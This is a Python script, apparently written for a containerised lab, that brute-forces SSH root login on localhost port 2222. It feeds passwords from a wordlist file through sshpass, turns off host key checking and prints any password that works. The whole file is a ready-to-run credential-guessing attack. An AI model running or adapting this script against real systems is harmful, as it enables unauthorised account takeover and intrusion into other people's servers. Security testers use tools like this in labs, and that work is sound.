import subprocess
import time
import sys

def try_ssh_login(password: str, host: str = "localhost", port: int = 2222, username: str = "root") -> bool:
    """Try to login via SSH using the given password"""
    try:
        # Using sshpass to automate password entry
        cmd = [
            "sshpass", 
            "-p", password, 
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-p", str(port),
            f"{username}@{host}",
            "exit"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0
    
    except Exception as e:
        print(f"Error trying password {password}: {str(e)}")
        return False

def main():
    print("Starting SSH brute force attack...")
    
    # Wait for the target container to be ready
    time.sleep(5)
    
    successful_password = None
    attempts = 0
    start_time = time.time()
    
    # Read passwords from file
    with open("possible_passwords.txt", "r") as f:
        passwords = [line.strip() for line in f]
    
    print(f"Loaded {len(passwords)} passwords to try")
    
    # Try each password
    for password in passwords:
        attempts += 1
        print(f"Trying password ({attempts}/{len(passwords)}): {password}")
        
        if try_ssh_login(password):
            successful_password = password
            break
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
    
    end_time = time.time()
    duration = end_time - start_time
    
    if successful_password:
        print(f"\nSuccess! Password found: {successful_password}")
    else:
        print("\nFailed to find the correct password")
    
    print(f"\nAttempted {attempts} passwords in {duration:.2f} seconds")

if __name__ == "__main__":
    main()
